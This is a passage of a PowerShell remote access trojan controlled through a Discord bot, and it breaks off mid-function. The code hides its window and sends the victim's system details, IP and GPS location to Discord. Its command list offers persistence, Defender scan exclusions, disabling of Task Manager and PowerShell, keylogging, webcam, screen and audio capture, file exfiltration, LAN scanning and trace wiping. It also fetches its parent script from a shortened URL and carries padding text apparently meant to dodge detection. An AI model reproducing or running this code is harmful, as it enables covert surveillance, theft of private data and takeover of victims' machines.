
# =====================================================================================================================================================
<#
**SETUP**
-SETUP THE BOT
1. make a discord bot at https://discord.com/developers/applications/
2. Enable all Privileged Gateway Intents on 'Bot' page
3. On OAuth2 page, tick 'Bot' in Scopes section
4. In Bot Permissions section tick Manage Channels, Read Messages/View Channels, Attach Files, Read Message History.
5. Copy the URL into a browser and add the bot to your server.
6. On 'Bot' page click 'Reset Token' and copy the token.

-SETUP THE SCRIPT
1. Copy the token into the script directly below.

**INFORMATION**
- The Discord bot you use must be in one server ONLY

USELESS PADDING
The Get-Content cmdlet gets the content of the item at the location specified by the path, such as the text in a file or the content of a function. For files, the content is read one line at a time and returns a collection of objects, each representing a line of content.
Beginning in PowerShell 3.0, Get-Content can also get a specified number of lines from the beginning or end of an item.
The Set-PSDebug cmdlet turns script debugging features on and off, sets the trace level, and toggles strict mode. By default, the PowerShell debug features are off.
When the Trace parameter has a value of 1, each line of script is traced as it runs. When the parameter has a value of 2, variable assignments, function calls, and script calls are also traced. If the Step parameter is specified, you're prompted before each line of the script runs.
Examples
Example 1: Get the content of a text file

This example gets the content of a file in the current directory. The LineNumbers.txt file has 100 lines in the format, This is Line X and is used in several examples.
-------------------------------------------------------------------------------------------------
#>
# =====================================================================================================================================================
$global:token = "$tk" # make sure your bot is in ONE server only
# =============================================================== SCRIPT SETUP =========================================================================

$HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
$spawnChannels = 1 # Create new channel on session start
$InfoOnConnect = 1 # Generate client info message on session start

$defaultstart = 0  # Option to start all jobs automatically upon running (DISABLED - Manual capture only)
if ($auto -eq 'n') {
    $defaultstart = 0 
}

$global:parent = "is.gd/0IyRWT" # parent script URL (for restarts and persistance)

# remove restart stager (if present)
if (Test-Path "C:\Windows\Tasks\service.vbs") {
    $InfoOnConnect = 0
    rm -path "C:\Windows\Tasks\service.vbs" -Force
}
$version = "1.5.1" # Check version number
$response = $null
$previouscmd = $null
$authenticated = 0
$timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"

# Rate limiting global pour Discord (5 requêtes/seconde max)
$global:lastDiscordRequest = Get-Date
$global:discordRequestInterval = 0.25  # 250ms entre chaque requête = 4 req/s (sous la limite de 5)

# =============================================================== MODULE FUNCTIONS =========================================================================
# Download ffmpeg.exe function (dependency for media capture) 
Function GetFfmpeg {
    sendMsg -Message ":hourglass: ``Downloading FFmpeg to Client.. Please Wait`` :hourglass:"
    $Path = "$env:Temp\ffmpeg.exe"
    $tempDir = "$env:temp"
    If (!(Test-Path $Path)) {  
        $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
        $wc = New-Object System.Net.WebClient           
        $wc.Headers.Add("User-Agent", "PowerShell")
        $response = $wc.DownloadString("$apiUrl")
        $release = $response | ConvertFrom-Json
        $asset = $release.assets | Where-Object { $_.name -like "*essentials_build.zip" }
        $zipUrl = $asset.browser_download_url
        $zipFilePath = Join-Path $tempDir $asset.name
        $extractedDir = Join-Path $tempDir ($asset.name -replace '.zip$', '')
        $wc.DownloadFile($zipUrl, $zipFilePath)
        Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
        Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
        rm -Path $zipFilePath -Force
        rm -Path $extractedDir -Recurse -Force
    }
}

# Create a new category for text channels function
Function NewChannelCategory {
    $headers = @{
        'Authorization' = "Bot $token"
    }
    $guildID = $null
    while (!($guildID)) {    
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", $headers.Authorization)    
        $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
        $guilds = $response | ConvertFrom-Json
        foreach ($guild in $guilds) {
            $guildID = $guild.id
        }
        sleep 3
    }
    $uri = "https://discord.com/api/guilds/$guildID/channels"
    $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object { [char]$_ })
    $body = @{
        "name" = "$env:COMPUTERNAME"
        "type" = 4
    } | ConvertTo-Json    
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $token")
    $wc.Headers.Add("Content-Type", "application/json")
    $response = $wc.UploadString($uri, "POST", $body)
    $responseObj = ConvertFrom-Json $response
    Write-Host "The ID of the new category is: $($responseObj.id)"
    $global:CategoryID = $responseObj.id
}

# Create a new channel function
Function NewChannel {
    param([string]$name)
    $headers = @{
        'Authorization' = "Bot $token"
    }    
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", $headers.Authorization)    
    $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
    $guilds = $response | ConvertFrom-Json
    foreach ($guild in $guilds) {
        $guildID = $guild.id
    }
    $uri = "https://discord.com/api/guilds/$guildID/channels"
    $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object { [char]$_ })
    $body = @{
        "name"      = "$name"
        "type"      = 0
        "parent_id" = $CategoryID
    } | ConvertTo-Json    
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $token")
    $wc.Headers.Add("Content-Type", "application/json")
    $response = $wc.UploadString($uri, "POST", $body)
    $responseObj = ConvertFrom-Json $response
    Write-Host "The ID of the new channel is: $($responseObj.id)"
    $global:ChannelID = $responseObj.id
}

# Send a message or embed to discord channel function
function sendMsg {
    param([string]$Message, [string]$Embed, [string]$ChannelID = $SessionID)

    if (-not $ChannelID) {
        Write-Host "Error: ChannelID is not set" -ForegroundColor Red
        return
    }

    $url = "https://discord.com/api/v10/channels/$ChannelID/messages"
    
    # Fonction helper pour respecter le rate limiting global
    function Wait-ForRateLimit {
        $elapsed = (Get-Date) - $global:lastDiscordRequest
        if ($elapsed.TotalSeconds -lt $global:discordRequestInterval) {
            $waitTime = $global:discordRequestInterval - $elapsed.TotalSeconds
            Start-Sleep -Milliseconds ([Math]::Ceiling($waitTime * 1000))
        }
        $global:lastDiscordRequest = Get-Date
    }
    
    # Fonction helper pour gérer les retries avec rate limiting
    function Invoke-DiscordRequest {
        param(
            [System.Net.WebClient]$client,
            [string]$url,
            [string]$body,
            [int]$maxRetries = 5
        )
        
        for ($retry = 0; $retry -lt $maxRetries; $retry++) {
            try {
                # Respecter le rate limiting avant chaque requête
                Wait-ForRateLimit
                $response = $client.UploadString($url, "POST", $body)
                return $true
            }
            catch {
                $statusCode = $null
                $retryAfter = 1
                $shouldRetry = $true
                
                # Extraire le code d'erreur HTTP depuis l'exception
                if ($_.Exception -is [System.Net.WebException]) {
                    $webException = $_.Exception
                    if ($webException.Response) {
                        $httpResponse = $webException.Response
                        $statusCode = [int]$httpResponse.StatusCode
                        
                        # Gérer le rate limiting (429)
                        if ($statusCode -eq 429) {
                            # Récupérer le header Retry-After
                            $retryAfterHeader = $httpResponse.Headers["Retry-After"]
                            if ($retryAfterHeader) {
                                $retryAfter = [int]$retryAfterHeader + 1  # +1 pour être sûr
                            }
                            else {
                                # Backoff exponentiel si pas de header
                                $retryAfter = [Math]::Min(60, [Math]::Pow(2, $retry))
                            }
                            
                            Write-Host "Rate limited (429). Waiting $retryAfter seconds before retry $($retry + 1)/$maxRetries..." -ForegroundColor Yellow
                            Start-Sleep -Seconds $retryAfter
                            $global:lastDiscordRequest = Get-Date  # Reset après attente
                            continue
                        }
                        # Gérer les erreurs 400 (Bad Request) - NE PAS RETRY
                        elseif ($statusCode -eq 400) {
                            try {
                                $reader = New-Object System.IO.StreamReader($httpResponse.GetResponseStream())
                                $responseBody = $reader.ReadToEnd()
                                $reader.Close()
                                Write-Host "Bad Request (400): $responseBody" -ForegroundColor Yellow
                            }
                            catch {
                                Write-Host "Bad Request (400): Unable to read response body" -ForegroundColor Yellow
                            }
                            # Ne pas retry pour les erreurs 400, c'est un problème de format
                            return $false
                        }
                    }
                }
                
                # Vérifier aussi dans le message d'erreur pour détecter 400/429
                $errorMessage = $_.Exception.Message
                if ($errorMessage -match "\(400\)") {
                    Write-Host "Bad Request (400) detected in error message. Not retrying." -ForegroundColor Yellow
                    return $false
                }
                if ($errorMessage -match "\(429\)") {
                    $retryAfter = [Math]::Min(60, [Math]::Pow(2, $retry))
                    Write-Host "Rate limited (429) detected. Waiting $retryAfter seconds..." -ForegroundColor Yellow
                    Start-Sleep -Seconds $retryAfter
                    $global:lastDiscordRequest = Get-Date
                    continue
                }
                
                # Pour les autres erreurs, retry avec backoff
                if ($retry -lt $maxRetries - 1) {
                    $waitTime = [Math]::Min(10, [Math]::Pow(2, $retry))
                    Write-Host "Error ($statusCode). Retrying in $waitTime seconds... ($($retry + 1)/$maxRetries)" -ForegroundColor Yellow
                    Start-Sleep -Seconds $waitTime
                }
                else {
                    Write-Host "Error sending message after $maxRetries retries: $($_.Exception.Message)" -ForegroundColor Red
                    return $false
                }
            }
        }
        return $false
    }
    
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        $wc.Headers.Add("Content-Type", "application/json")

        if ($Embed) {
            if (-not $script:jsonPayload) {
                Write-Host "Error: jsonPayload is not set for Embed" -ForegroundColor Red
                return
            }
            $jsonBody = $script:jsonPayload | ConvertTo-Json -Depth 10 -Compress
            Invoke-DiscordRequest -client $wc -url $url -body $jsonBody | Out-Null
            
            if ($webhook) {
                $body = @{"username" = "Scam BOT" ; "content" = "$jsonBody" } | ConvertTo-Json
                Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $jsonBody -ErrorAction SilentlyContinue
            }
            $script:jsonPayload = $null
        }
        if ($Message) {
            # Limiter la taille du message à 2000 caractères (limite Discord)
            if ($Message.Length -gt 2000) {
                $Message = $Message.Substring(0, 1997) + "..."
            }
            
            # Nettoyer les caractères de contrôle qui peuvent causer des erreurs 400
            $Message = $Message -replace "[\x00-\x1F]", ""
            
            # S'assurer que le message n'est pas vide après nettoyage
            if ([string]::IsNullOrWhiteSpace($Message)) {
                Write-Host "Message is empty after cleaning, skipping send" -ForegroundColor Yellow
                return
            }
            
            try {
                $jsonBody = @{
                    "content" = $Message
                } | ConvertTo-Json -Compress -ErrorAction Stop
            }
            catch {
                Write-Host "Error converting message to JSON: $($_.Exception.Message)" -ForegroundColor Red
                Write-Host "Message content: $Message" -ForegroundColor Yellow
                return
            }
            
            Invoke-DiscordRequest -client $wc -url $url -body $jsonBody | Out-Null
        }
    }
    catch {
        Write-Host "Critical error in sendMsg: $($_.Exception.Message)" -ForegroundColor Red
    }
    finally {
        if ($wc) {
            $wc.Dispose()
        }
    }
}

function sendFile {
    param([string]$sendfilePath, [string]$ChannelID = $SessionID)

    if (-not $ChannelID) {
        Write-Host "Error: ChannelID is not set" -ForegroundColor Red
        return
    }

    if (-not $sendfilePath) {
        Write-Host "Error: No file path provided" -ForegroundColor Red
        return
    }

    if (-not (Test-Path $sendfilePath -PathType Leaf)) {
        Write-Host "File not found: $sendfilePath" -ForegroundColor Red
        sendMsg -Message ":octagonal_sign: ``File not found: $sendfilePath`` :octagonal_sign:" -ChannelID $ChannelID
        return
    }

    try {
        $fileInfo = Get-Item $sendfilePath
        $maxFileSize = 25MB  # Limite Discord pour les fichiers
        
        if ($fileInfo.Length -gt $maxFileSize) {
            Write-Host "File too large ($([math]::Round($fileInfo.Length/1MB, 2)) MB). Discord limit is 25MB." -ForegroundColor Yellow
            sendMsg -Message ":octagonal_sign: ``File too large: $($fileInfo.Name) ($([math]::Round($fileInfo.Length/1MB, 2)) MB). Max size: 25MB`` :octagonal_sign:" -ChannelID $ChannelID
            return
        }

        $url = "https://discord.com/api/v10/channels/$ChannelID/messages"
        $maxRetries = 5
        
        # Fonction helper pour respecter le rate limiting
        function Wait-ForRateLimit {
            $elapsed = (Get-Date) - $global:lastDiscordRequest
            if ($elapsed.TotalSeconds -lt $global:discordRequestInterval) {
                $waitTime = $global:discordRequestInterval - $elapsed.TotalSeconds
                Start-Sleep -Milliseconds ([Math]::Ceiling($waitTime * 1000))
            }
            $global:lastDiscordRequest = Get-Date
        }
        
        for ($retry = 0; $retry -lt $maxRetries; $retry++) {
            $webClient = $null
            try {
                # Respecter le rate limiting avant chaque requête
                Wait-ForRateLimit
                
                $webClient = New-Object System.Net.WebClient
                $webClient.Headers.Add("Authorization", "Bot $token")
                
                $response = $webClient.UploadFile($url, "POST", $sendfilePath)
                Write-Host "Attachment sent to Discord: $sendfilePath" -ForegroundColor Green
                return
            }
            catch {
                $statusCode = $null
                $retryAfter = 1
                $shouldRetry = $true
                
                # Extraire le code d'erreur HTTP depuis l'exception
                if ($_.Exception -is [System.Net.WebException]) {
                    $webException = $_.Exception
                    if ($webException.Response) {
                        $httpResponse = $webException.Response
                        $statusCode = [int]$httpResponse.StatusCode
                        
                        # Gérer le rate limiting (429)
                        if ($statusCode -eq 429) {
                            $retryAfterHeader = $httpResponse.Headers["Retry-After"]
                            if ($retryAfterHeader) {
                                $retryAfter = [int]$retryAfterHeader + 1  # +1 pour être sûr
                            }
                            else {
                                $retryAfter = [Math]::Min(60, [Math]::Pow(2, $retry))
                            }
                            
                            Write-Host "Rate limited (429) uploading file. Waiting $retryAfter seconds before retry $($retry + 1)/$maxRetries..." -ForegroundColor Yellow
                            Start-Sleep -Seconds $retryAfter
                            $global:lastDiscordRequest = Get-Date  # Reset après attente
                            continue
                        }
                        # Erreur 400 - problème de format, NE PAS RETRY
                        elseif ($statusCode -eq 400) {
                            try {
                                $reader = New-Object System.IO.StreamReader($httpResponse.GetResponseStream())
                                $responseBody = $reader.ReadToEnd()
                                $reader.Close()
                                Write-Host "Bad Request (400) uploading file: $responseBody" -ForegroundColor Yellow
                            }
                            catch {
                                Write-Host "Bad Request (400) uploading file: Unable to read response" -ForegroundColor Yellow
                            }
                            # Ne pas retry pour les erreurs 400
                            $fileName = if ($fileInfo -and $fileInfo.Name) { $fileInfo.Name } else { Split-Path -Leaf $sendfilePath }
                            sendMsg -Message ":octagonal_sign: ``Failed to upload: $fileName - Bad Request (400)`` :octagonal_sign:" -ChannelID $ChannelID
                            return
                        }
                    }
                }
                
                # Vérifier aussi dans le message d'erreur pour détecter 400/429
                $errorMessage = $_.Exception.Message
                if ($errorMessage -match "\(400\)") {
                    Write-Host "Bad Request (400) detected in error message. Not retrying." -ForegroundColor Yellow
                    $fileName = if ($fileInfo -and $fileInfo.Name) { $fileInfo.Name } else { Split-Path -Leaf $sendfilePath }
                    sendMsg -Message ":octagonal_sign: ``Failed to upload: $fileName - Bad Request (400)`` :octagonal_sign:" -ChannelID $ChannelID
                    return
                }
                if ($errorMessage -match "\(429\)") {
                    $retryAfter = [Math]::Min(60, [Math]::Pow(2, $retry))
                    Write-Host "Rate limited (429) detected. Waiting $retryAfter seconds..." -ForegroundColor Yellow
                    Start-Sleep -Seconds $retryAfter
                    $global:lastDiscordRequest = Get-Date
                    continue
                }
                
                # Pour les autres erreurs, retry avec backoff
                if ($retry -lt $maxRetries - 1) {
                    $waitTime = [Math]::Min(10, [Math]::Pow(2, $retry))
                    $statusDisplay = if ($statusCode) { "$statusCode" } else { "unknown" }
                    Write-Host "Error uploading file ($statusDisplay). Retrying in $waitTime seconds... ($($retry + 1)/$maxRetries)" -ForegroundColor Yellow
                    Start-Sleep -Seconds $waitTime
                }
                else {
                    $fileName = if ($fileInfo -and $fileInfo.Name) { $fileInfo.Name } else { Split-Path -Leaf $sendfilePath }
                    Write-Host "Error uploading file after $maxRetries retries: $($_.Exception.Message)" -ForegroundColor Red
                    $errorMsg = "Failed to upload: $fileName - $($_.Exception.Message)"
                    if ($errorMsg.Length -gt 1900) {
                        $errorMsg = "Failed to upload: $fileName - Error occurred"
                    }
                    sendMsg -Message ":octagonal_sign: ``$errorMsg`` :octagonal_sign:" -ChannelID $ChannelID
                }
            }
            finally {
                if ($webClient) {
                    $webClient.Dispose()
                }
            }
        }
    }
    catch {
        Write-Host "Critical error in sendFile: $($_.Exception.Message)" -ForegroundColor Red
        sendMsg -Message ":octagonal_sign: ``Error processing file: $($_.Exception.Message)`` :octagonal_sign:" -ChannelID $ChannelID
    }
}

# Gather System and user information
Function quickInfo {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Device
    $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
    $GeoWatcher.Start()
    while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) { Sleep -M 100 }  
    if ($GeoWatcher.Permission -eq 'Denied') { $GPS = "Location Services Off" }
    else {
        $GL = $GeoWatcher.Position.Location | Select Latitude, Longitude; $GL = $GL -split " "
        $Lat = $GL[0].Substring(11) -replace ".$"; $Lon = $GL[1].Substring(10) -replace ".$"
        $GPS = "LAT = $Lat LONG = $Lon"
    }
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
        $adminperm = "False"
    }
    else {
        $adminperm = "True"
    }
    $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
    $userInfo = Get-WmiObject -Class Win32_UserAccount
    $processorInfo = Get-WmiObject -Class Win32_Processor
    $computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
    $userInfo = Get-WmiObject -Class Win32_UserAccount
    $videocardinfo = Get-WmiObject Win32_VideoController
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; $Width = $Screen.Width; $Height = $Screen.Height; $screensize = "${width} x ${height}"
    $email = (Get-ComputerInfo).WindowsRegisteredOwner
    $OSString = "$($systemInfo.Caption)"
    $OSArch = "$($systemInfo.OSArchitecture)"
    $RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB) }
    $processor = "$($processorInfo.Name)"
    $gpu = "$($videocardinfo.Name)"
    $ver = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
    $systemLocale = Get-WinSystemLocale; $systemLanguage = $systemLocale.Name
    $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
    $script:jsonPayload = @{
        username = $env:COMPUTERNAME
        tts      = $false
        embeds   = @(
            @{
                title         = "$env:COMPUTERNAME | Computer Information "
                "description" = @"
``````SYSTEM INFORMATION FOR $env:COMPUTERNAME``````
:man_detective: **User Information** :man_detective:
- **Current User**          : ``$env:USERNAME``
- **Email Address**         : ``$email``
- **Language**              : ``$systemLanguage``
- **Administrator Session** : ``$adminperm``

:minidisc: **OS Information** :minidisc:
- **Current OS**            : ``$OSString - $ver``
- **Architechture**         : ``$OSArch``

:globe_with_meridians: **Network Information** :globe_with_meridians:
- **Public IP Address**     : ``$computerPubIP``
- **Location Information**  : ``$GPS``

:desktop: **Hardware Information** :desktop:
- **Processor**             : ``$processor`` 
- **Memory**                : ``$RamInfo``
- **Gpu**                   : ``$gpu``
- **Screen Size**           : ``$screensize``

``````COMMAND LIST``````
- **Options**               : Show The Options Menu
- **ExtraInfo**             : Show The Extra Info Menu
- **Close**                 : Close this session

"@
                color         = 65280
            }
        )
    }
    sendMsg -Embed $jsonPayload -webhook $webhook
}

# Hide powershell console window function
function HideWindow {
    try {
        $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
        $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
        $hwnd = (Get-Process -PID $pid).MainWindowHandle
        if ($hwnd -ne [System.IntPtr]::Zero) {
            $Type::ShowWindowAsync($hwnd, 0) | Out-Null
        }
        else {
            $Host.UI.RawUI.WindowTitle = 'hideme'
            Start-Sleep -Milliseconds 100
            $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' } | Select-Object -First 1)
            if ($Proc -and $Proc.MainWindowHandle -ne [System.IntPtr]::Zero) {
                $hwnd = $Proc.MainWindowHandle
                $Type::ShowWindowAsync($hwnd, 0) | Out-Null
            }
        }
    }
    catch {
        # Ignorer silencieusement si la fenêtre ne peut pas être masquée
        Write-Host "Could not hide window: $($_.Exception.Message)" -ForegroundColor Yellow
    }
}

# --------------------------------------------------------------- HELP FUNCTIONS ------------------------------------------------------------------------

Function Options {
    $script:jsonPayload = @{
        username = $env:COMPUTERNAME
        tts      = $false
        embeds   = @(
            @{
                title         = "$env:COMPUTERNAME | Commands List "
                "description" = @"

### SYSTEM
- **AddPersistance**: Add this script to startup (multiple persistence methods)
- **RemovePersistance**: Remove all persistence methods from startup
- **IsAdmin**: Check if the session is admin
- **Elevate**: Attempt to restart script as admin (!user popup!)
- **ExcludeCDrive**: Exclude C:/ Drive from all Defender Scans (admin only)
- **ExcludeAllDrives**: Exclude C:/ - G:/ Drives from Defender Scans (admin only)
- **EnableIO**: Enable Keyboard and Mouse (admin only)
- **DisableIO**: Disable Keyboard and Mouse (admin only)
- **DisableTaskManager**: Disable Task Manager (admin only)
- **EnableTaskManager**: Enable Task Manager (admin only)
- **DisableCMD**: Disable Command Prompt (admin only)
- **EnableCMD**: Enable Command Prompt (admin only)
- **DisablePowerShell**: Disable PowerShell (admin only)
- **EnablePowerShell**: Enable PowerShell (admin only)
- **OpenURL**: Open a URL in default browser (OpenURL -Url http://example.com)
- **BlockURL**: Block a URL via hosts file (admin only, BlockURL -Url example.com)
- **UnblockURL**: Unblock a URL from hosts file (admin only, UnblockURL -Url example.com)
- **Exfiltrate**: Send various files. (see ExtraInfo)
- **Upload**: Upload a file to target. (see ExtraInfo)
- **StartUvnc**: Start UVNC client (use: ``StartUvnc -ip 192.168.1.1 -port 8080``)
- **SpeechToText**: Send audio transcript to Discord (use kill command to stop)
- **TextToSpeech**: Convert text to speech (usage: TextToSpeech -Text "your message")
- **EnumerateLAN**: Show devices on LAN and send to Discord (see ExtraInfo)
- **NearbyWifi**: Show nearby WiFi networks and send to Discord (opens network selection window briefly)
- **GetMousePosition**: Get current mouse cursor position (X, Y)
- **MoveMouse**: Move mouse cursor to coordinates (usage: MoveMouse -X 100 -Y 200)
- **MouseClick**: Perform mouse click (usage: MouseClick -Button left|right)
- **TypeText**: Type text using keyboard (usage: TypeText -Text "your text")
- **RecordScreen**: Record Screen and send to Discord
- **TakePhoto**: Take a single photo from camera (manual capture)
- **TakeScreenshot**: Capture a single screenshot (manual capture)
- **RecordAudioClip**: Record audio clip of specified duration (manual capture, use: RecordAudioClip 30)

### PRANKS
- **FakeUpdate**: Simulate Windows 10 update screen using Chrome (use StopFakeUpdate to close)
- **Windows93**: Launch Windows93 parody using Chrome (use StopWindows93 to close)
- **WindowsIdiot**: Start fake Windows95 using Chrome (use StopWindowsIdiot to close)
- **SendHydra**: Endless popups (use StopHydra to stop)
- **SoundSpam**: Play all Windows default sounds (use StopSoundSpam to stop)
- **Message**: Send a message window to the User (!user popup!)
- **VoiceMessage**: Send a voice message to the User (!user popup!)
- **MinimizeAll**: Minimize all windows
- **EnableDarkMode**: Enable system-wide Dark Mode
- **DisableDarkMode**: Disable system-wide Dark Mode
- **ShortcutBomb**: Create 50 shortcuts on the desktop
- **Wallpaper**: Set the wallpaper (Wallpaper -url http://img.com/f4wc)
- **Goose**: Spawn an annoying goose (Sam Pearson App) (use StopGoose to stop)
- **ScreenParty**: Start a disco on screen! (use StopScreenParty to stop early)

### JOBS
- **Microphone**: Record microphone clips and send to Discord (AUTOMATIC CAPTURE DISABLED - Use RecordAudioClip instead)
- **Webcam**: Stream webcam pictures to Discord (AUTOMATIC CAPTURE DISABLED - Use TakePhoto instead)
- **Screenshots**: Sends screenshots of the desktop to Discord (AUTOMATIC CAPTURE DISABLED - Use TakeScreenshot instead)
- **Keycapture**: Capture Keystrokes and send to Discord
- **SystemInfo**: Gather System Info and send to Discord

### CONTROL
- **ExtraInfo**: Get a list of further info and command examples
- **Cleanup**: Wipe history (run prompt, powershell, recycle bin, Temp)
- **Kill**: Stop a running module (eg. Exfiltrate)
- **PauseJobs**: Pause the current jobs for this session
- **ResumeJobs**: Resume all jobs for this session
- **Close**: Close this session
"@
                color         = 65280
            }
        )
    }
    sendMsg -Embed $jsonPayload
}

Function ExtraInfo {
    $script:jsonPayload = @{
        username = $env:COMPUTERNAME
        tts      = $false
        embeds   = @(
            @{
                title         = "$env:COMPUTERNAME | Extra Information "
                "description" = @"
``````Example Commands``````

**Default PS Commands:**
> PS> ``whoami`` (Returns Powershell commands)

**Exfiltrate Command Examples:**
> PS> ``Exfiltrate -Path Documents -Filetype png``
> PS> ``Exfiltrate -Filetype log``
> PS> ``Exfiltrate``
Exfiltrate only will send many pre-defined filetypes
from all User Folders like Documents, Downloads etc..

**Upload Command Example:**
> PS> ``Upload -Path C:/Path/To/File.txt``
Use 'FolderTree' command to show all files

**Enumerate-LAN:**
Automatically detects local subnet and scans all devices (192.168.x.1 to 192.168.x.254). Results are sent to Discord.

**Prank Examples:**
> PS> ``Message 'Your Message Here!'``
> PS> ``VoiceMessage 'Your Message Here!'``
> PS> ``wallpaper -url http://img.com/f4wc``

**Record Examples:**
> PS> ``RecordScreen -t 100`` (number of seconds to record)
> PS> ``RecordAudioClip 30`` (number of seconds to record audio)

**Kill Command modules:**
- Exfiltrate
- SendHydra
- SpeechToText
"@
                color         = 65280
            }
        )
    }
    sendMsg -Embed $jsonPayload
}

Function CleanUp { 
    Remove-Item $env:temp\* -r -Force -ErrorAction SilentlyContinue
    Remove-Item (Get-PSreadlineOption).HistorySavePath
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue

    $campath = "$env:Temp\Image.jpg"
    $screenpath = "$env:Temp\Screen.jpg"
    $micpath = "$env:Temp\Audio.mp3"
    If (Test-Path $campath) {  
        rm -Path $campath -Force
    }
    If (Test-Path $screenpath) {  
        rm -Path $screenpath -Force
    }
    If (Test-Path $micpath) {  
        rm -Path $micpath -Force
    }

    sendMsg -Message ":white_check_mark: ``Clean Up Task Complete`` :white_check_mark:"
}

# --------------------------------------------------------------- INFO FUNCTIONS ------------------------------------------------------------------------
Function EnumerateLAN {
    try {
        sendMsg -Message ":hourglass: Searching Network Devices - please wait.. :hourglass:"
        $localIP = (Get-NetIPAddress -AddressFamily IPv4 | 
            Where-Object SuffixOrigin -eq "Dhcp" | 
            Select-Object -ExpandProperty IPAddress)
        
        if ($localIP -match '^(\d{1,3}\.\d{1,3}\.\d{1,3})\.\d{1,3}$') {
            $subnet = $matches[1]
            1..254 | ForEach-Object {
                Start-Process -WindowStyle Hidden ping.exe -ArgumentList "-n 1 -l 0 -f -i 2 -w 100 -4 $subnet.$_"
            }    
            sleep 2
            $IPDevices = (arp.exe -a | Select-String "$subnet.*dynam") -replace ' +', ',' | ConvertFrom-Csv -Header Computername, IPv4, MAC | Where-Object { $_.MAC -ne 'dynamic' } | Select-Object IPv4, MAC, Computername
            
            $IPDevices | ForEach-Object {
                try {
                    $ip = $_.IPv4
                    $hostname = ([System.Net.Dns]::GetHostEntry($ip)).HostName
                    $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value $hostname -Force
                }
                catch {
                    $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value "N/A" -Force
                }
            }
            
            # Formater proprement pour Discord (sans Format-Table qui cause des problèmes)
            if ($IPDevices -and $IPDevices.Count -gt 0) {
                $output = ":white_check_mark: **Network Devices Found:**`n`n"
                $output += "IPv4 | Hostname | MAC`n"
                $output += "--- | --- | ---`n"
                
                foreach ($device in $IPDevices) {
                    $hostname = if ($device.Hostname -and $device.Hostname -ne "N/A") { $device.Hostname } else { "N/A" }
                    $output += "$($device.IPv4) | $hostname | $($device.MAC)`n"
                }
                
                # Limiter la taille pour éviter erreurs 400
                if ($output.Length -gt 1900) {
                    $output = ":white_check_mark: **Network Devices Found:** ($($IPDevices.Count) devices)`n`n"
                    $output += "IPv4 | Hostname | MAC`n"
                    $output += "--- | --- | ---`n"
                    foreach ($device in $IPDevices[0..9]) {
                        $hostname = if ($device.Hostname -and $device.Hostname -ne "N/A") { $device.Hostname } else { "N/A" }
                        $output += "$($device.IPv4) | $hostname | $($device.MAC)`n"
                    }
                    if ($IPDevices.Count -gt 10) {
                        $output += "... and $($IPDevices.Count - 10) more device(s)"
                    }
                }
                
                sendMsg -Message "``$output``"
            }
            else {
                sendMsg -Message ":octagonal_sign: ``No network devices found on subnet $subnet.0/24`` :octagonal_sign:"
            }
        }
        else {
            sendMsg -Message ":octagonal_sign: ``Could not detect local IP address or subnet`` :octagonal_sign:"
        }
    }
    catch {
        sendMsg -Message ":octagonal_sign: ``Error enumerating LAN: $($_.Exception.Message)`` :octagonal_sign:"
    }
}

Function NearbyWifi {
    try {
        sendMsg -Message ":hourglass: Scanning nearby WiFi networks - please wait.. :hourglass:"
        
        # Ouvrir la fenêtre de sélection réseau (optionnel, peut être commenté si non nécessaire)
        try {
            $showNetworks = explorer.exe ms-availablenetworks: 2>$null
            sleep 2
            $wshell = New-Object -ComObject wscript.shell -ErrorAction SilentlyContinue
            if ($wshell) {
                $wshell.AppActivate('explorer.exe') 2>$null
                Start-Sleep -Milliseconds 500
                $wshell.SendKeys('{ESC}') 2>$null
                Start-Sleep -Milliseconds 200
            }
        }
        catch {
            # Ignorer les erreurs de la fenêtre popup
        }
        
        # Obtenir les réseaux WiFi
        $wifiOutput = netsh wlan show networks mode=Bssid 2>$null
        if (-not $wifiOutput) {
            sendMsg -Message ":octagonal_sign: ``No WiFi networks found or WiFi adapter not available`` :octagonal_sign:"
            return
        }
        
        # Parser les réseaux WiFi
        $networks = @()
        $currentNetwork = $null
        
        foreach ($line in $wifiOutput) {
            if ($line -match '^SSID\s+\d+\s*:\s*(.+)$') {
                if ($currentNetwork) {
                    $networks += $currentNetwork
                }
